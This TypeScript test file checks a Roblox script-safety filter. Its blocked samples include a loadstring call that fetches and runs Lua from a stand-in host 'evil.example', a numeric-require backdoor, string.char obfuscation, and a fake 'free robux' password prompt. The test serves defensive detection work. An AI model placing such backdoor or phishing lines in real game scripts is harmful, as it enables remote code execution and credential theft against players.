import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { checkScriptSafety } from "./script-safety";

describe("script safety", () => {
  it("blocks backdoors and remote code execution", () => {
    for (const src of [
      'loadstring(game:HttpGet("https://evil.example/x.lua"))()',
      "local m = require(1234567890)",
      "getfenv().print = nil",
      'if player.Name == "someguy" then player.Character:Destroy() end',
      'local a = string.char(104)..string.char(101)..string.char(108)..string.char(108)..string.char(111)..string.char(33)..string.char(33)',
      "local gui = 'Enter your password to claim free robux'",
      "-- this will bypass the chat filter",
    ]) {
      assert.equal(checkScriptSafety(src).blocked, true, src.slice(0, 40));
    }
  });

  it("leaves ordinary game scripts alone", () => {
    for (const src of [
      `local Players = game:GetService("Players")
       Players.PlayerAdded:Connect(function(p) print(p.Name) end)`,
      `local part = Instance.new("Part")
       part.Anchored = true
       part.Parent = workspace`,
      `local RS = game:GetService("ReplicatedStorage")
       RS.Remotes.Buy.OnServerEvent:Connect(function(player, itemId)
         if type(itemId) ~= "string" then return end
       end)`,
      `local http = game:GetService("HttpService")
       local data = http:JSONEncode({ score = 10 })`,
      "task.wait(1) humanoid.Health = humanoid.Health - 10",
    ]) {
      assert.equal(checkScriptSafety(src).blocked, false, src.slice(0, 40));
    }
  });
});
